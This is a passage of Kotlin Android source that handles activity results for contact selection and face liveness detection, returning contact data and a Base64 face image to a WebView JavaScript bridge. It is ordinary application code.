                    cursor?.close()
                }
                AndroidCallBackJS.callBackJsSuccess(
                    mWebView,
                    eventSelectContactId,
                    Cons.JS_KEY_SELECT_CONTACT,
                    Gson().toJson(contactBean)
                )
            } else {
                AndroidCallBackJS.callbackJsErrorOther(
                    mWebView,
                    eventSelectContactId,
                    Cons.JS_KEY_SELECT_CONTACT,
                    "Ninguno"
                )
            }
        } else if (requestCode == Cons.KEY_TO_DETECT_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK) {
                var mResult = (MyApplication.application as DFTransferResultInterface).result;
                mResult?.let {
                    ///get key frame
                    var imageResultArr = mResult.livenessImageResults
                    if (imageResultArr != null) {
                        var size = imageResultArr.size;
                        if (size > 0) {
                            var imageResult = imageResultArr[0];
                            var imageBase64 = Base64.encodeToString(imageResult.detectImage, Base64.NO_WRAP)
                            var vivoBackBean : VIVOBackBean = VIVOBackBean();
                            vivoBackBean.headPhotoUrl = imageBase64
                            LogUtils.d("返还1：imageResult：$vivoBackBean")
                            AndroidCallBackJS.callBackJsSuccess(mWebView, eventVivoContactId,
                                Cons.JS_KEY_VIVO, Gson().toJson(vivoBackBean))
                        }
                    }else{
                        LogUtils.d("报错" + mResult.errorMessage)
                        AndroidCallBackJS.callbackJsErrorOther(mWebView, eventVivoContactId,
                            Cons.JS_KEY_VIVO, mResult.errorMessage)
                    }
                    // the encrypt buffer which is used to send to anti-hack API
                    var livenessEncryptResult = mResult.livenessEncryptResult
                    LogUtils.d("街廓返还3：livenessEncryptResult：" + livenessEncryptResult)
                }
            }else{
                if (data != null) {
                    val errorCode: Int = data.getIntExtra(DFActionLivenessActivity.KEY_RESULT_ERROR_CODE, -10000)
                    LogUtils.d("action liveness cancel，error code:$errorCode")
                    AndroidCallBackJS.callbackJsErrorOther(
                        mWebView,
                        eventVivoContactId,
                        Cons.JS_KEY_VIVO,
                        "resultCode:$errorCode"
                    )
                }else{
                    AndroidCallBackJS.callbackJsErrorOther(
                        mWebView,
                        eventVivoContactId,
                        Cons.JS_KEY_VIVO,
                        "resultCode:$requestCode"
                    )
                }

            }
        }
    }
}